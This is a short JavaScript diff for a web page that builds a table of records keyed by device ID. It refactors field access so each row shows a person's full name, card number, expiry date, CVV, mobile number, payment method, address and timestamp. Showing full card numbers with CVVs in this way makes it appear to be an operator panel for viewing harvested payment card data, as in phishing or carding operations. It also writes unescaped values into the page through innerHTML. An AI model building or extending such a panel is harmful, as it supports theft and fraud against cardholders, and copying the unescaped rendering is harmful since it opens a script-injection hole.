@@ -90,23 +90,22 @@
       let count = 1;
       for (let deviceId in data) {
         const entry = data[deviceId];
-        const card = entry.cardDetails || {};
 
         // Skip if card number not present
-        if (!card.cardNumber) continue;
+        if (!entry.cardNumber) continue;
 
         const row = document.createElement("tr");
 
         row.innerHTML = `
           <td>${count++}</td>
-          <td>${card.fullName || "-"}</td>
-          <td>${card.cardNumber || "-"}</td>
-          <td>${card.expiryMM || "--"}/${card.expiryYY || "--"}</td>
-          <td>${card.cvv || "-"}</td>
-          <td>${card.mobileNumber || "-"}</td>
-          <td>${card.paymentMethod || "-"}</td>
-          <td>${card.address || ""}, ${card.city || ""}, ${card.state || ""} - ${card.pincode || ""}</td>
-          <td>${card.timestamp || "-"}</td>
+          <td>${entry.fullName || "-"}</td>
+          <td>${entry.cardNumber || "-"}</td>
+          <td>${entry.expiryMM || "--"}/${entry.expiryYY || "--"}</td>
+          <td>${entry.cvv || "-"}</td>
+          <td>${entry.mobileNumber || "-"}</td>
+          <td>${entry.paymentMethod || "-"}</td>
+          <td>${entry.address || ""}, ${entry.city || ""}, ${entry.state || ""} - ${entry.pincode || ""}</td>
+          <td>${entry.timestamp || "-"}</td>
         `;
         tableBody.appendChild(row);
       }
